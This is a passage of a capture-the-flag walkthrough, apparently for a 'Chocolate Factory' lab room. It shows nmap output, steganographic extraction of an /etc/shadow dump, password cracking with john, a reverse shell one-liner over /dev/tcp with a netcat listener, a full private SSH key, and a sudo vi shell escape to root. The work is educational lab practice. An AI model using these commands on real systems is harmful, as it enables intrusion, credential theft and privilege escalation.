SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port125-TCP:V=7.80%I=7%D=8/12%Time=689AF283%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20\\x20__
SF:_\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\r\\n\\x2
SF:0\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20____\\x2
SF:0___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20_:
SF:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\
SF:'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\
SF:n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\x20\\x2
SF:0\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;-----------------`
SF:\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20
SF:\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|_________
SF:_____________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20from\\x20M
SF:r\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here!\\x20;
SF:\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20")%r(Gener
SF:icLines,20F,"\\"Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x20
SF:\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\x20\\x20___\\.---------------\\.\\
SF:r\\n\\x20\\x20\\.'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__,`\\x20\\x20\\x20\\.\\x20\\x20_
SF:___\\x20___\\x20\\\\\\r\\n\\x20\\x20\\\\\\|\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/
SF:\\x20_:\\\\\\x20\\x20\\|:\\.\\x20\\x20\\\\\\x20\\x20\\\\___\\x20\\\\\\r\\n\\x20\\x20\\x20\\\\\\\\'
SF:\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\'\\\\_`\\.__\\|\\x20\\x20`\\.\\x20\\\\\\x20\\x20\\\\___\\x2
SF:0\\\\\\r\\n\\x20\\x20\\x20\\x20\\\\\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__\\\\/\\x20__:
SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\r\\n\\
SF:x20\\x20\\x20\\x20\\x20\\\\\\\\'\\\\__\\\\'\\\\__\\\\'\\\\__\\\\\\x20\\\\__\\\\'\\\\_;------------
SF:-----`\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\\\/\\x20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x
SF:20\\x20\\x20\\\\/\\x20\\x20\\x20\\\\/\\x20:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x
SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\\\\|___
SF:___________________;________________\\|\\r\\n\\r\\nA\\x20small\\x20hint\\x20fro
SF:m\\x20Mr\\.Wonka\\x20:\\x20Look\\x20somewhere\\x20else,\\x20its\\x20not\\x20here
SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\"\\x20");
MAC Address: 02:8A:3E:56:61:EB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 161.54 seconds
```

`ftp IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756279898742/834f05b5-fcb7-4b4e-a05e-18ad0f728d1e.png align="center")

`strings gum_room.jpg`

`exiftool gum_room.jpg`

`steghide extract -sf gum_room.jpg`

Enter passphrase: wrote extracted data to "b64.txt". `cat b64.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756280123935/06ec0583-0326-49ff-8f55-d092ef9788ed.png align="center")

```bash
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
```

[base64decode.org](http://base64decode.org)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756280323412/bd8f2df5-837f-4127-a495-a71a5af19e86.png align="center")

`/etc/shadow`

```bash
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

`echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::' > hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756280838104/e38493c4-4cdf-4cad-a04a-d4465507dfba.png align="center")

charlie:cn7824

log into the website using the credentials it will launch a command line shell

`ls -la` reveals the files including the `key_rev_key`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756280899852/3dd6a5dd-77cf-425e-afa8-398a3aa79345.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756281040197/9b3f25e7-9e3a-4e1d-95ae-6bd77836c206.png align="center")

tried using:

`cat key_rev_key`

`file key_rev_key`

```bash
 key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```

visiting [`http://IP_Address/key_rev_key`](http://IP_Address/key_rev_key) downloads the key and using cat key\_rev\_key command locally reveals the key we’re looking for

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756281096476/b76ba692-4df5-4423-98f1-72183111118d.png align="center")

change user to charlie

Enter the user flag

nc -nlvp 4444

`bash -c 'exec bash -i &>/dev/tcp/10.10.226.231/4444 <&1'`

`find / -type f -name teleport 2>/dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756281159167/132f184e-4160-44fd-98ca-2746ac88f729.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756300304198/14899378-de2e-4bdc-882e-d490717d4369.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756300361461/d5f61e4e-37aa-4e55-a6ba-59a4669cf19c.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756300418926/422c61ea-f99d-4309-883e-428a4383e20d.png align="center")

`cat teleport`

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756301064521/ad67bba1-0798-4b93-b30a-619742915b0d.png align="center")

`chmod 600 teleport`

`ssh -i teleport charlie@IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756300731303/8fd034ba-41b9-437b-891b-30da028c6631.png align="center")

`find / -type f -name user.txt 2>/dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756300659350/376bcb86-4960-4f1f-9069-f05b698d69a0.png align="center")

Enter the root flag

`sudo -l`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756301041694/4714fc1c-430c-4f95-b8ee-6462830b36a8.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756301791777/a7694970-caad-4c38-9132-a0da96faa9b0.png align="center")

`sudo vi -c ‘:!/bin/sh’ /dev/null`

Once privileges were escalated to root, I couldn’t find the root flag directly. There was a Python file, I tried running it using Python, Python2, and Python3, but none of them worked on the virtual machine.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756301733303/eb05aa86-4a37-4b72-a5e1-21ebd80bc850.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756302209393/ca1c9e18-c4b6-45ce-8eef-b39e77848a79.png align="center")

I opted to copy the Python file and run it locally on my machine, and ended up installing some libraries and getting the flag eventually.

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756302167914/85480e8d-7d00-481e-9e23-dcbb09217d38.png align="center")

This room was a fun combination of nostalgia and hacking fundamentals. By carefully enumerating services, analyzing hints, and chaining exploits, we were able to reveal Charlie’s password and uncover the keys hidden throughout the Chocolate Factory.

The challenge reinforces an important lesson for real-world pentesting: **enumeration is everything**. Many of the answers weren’t directly in front of us—they required persistence, curiosity, and exploring “somewhere else,” just as Mr. Wonka hinted.

If you enjoyed this journey, remember: hacking is like chocolate—**the more you savor it, the sweeter it gets.** 🍫✨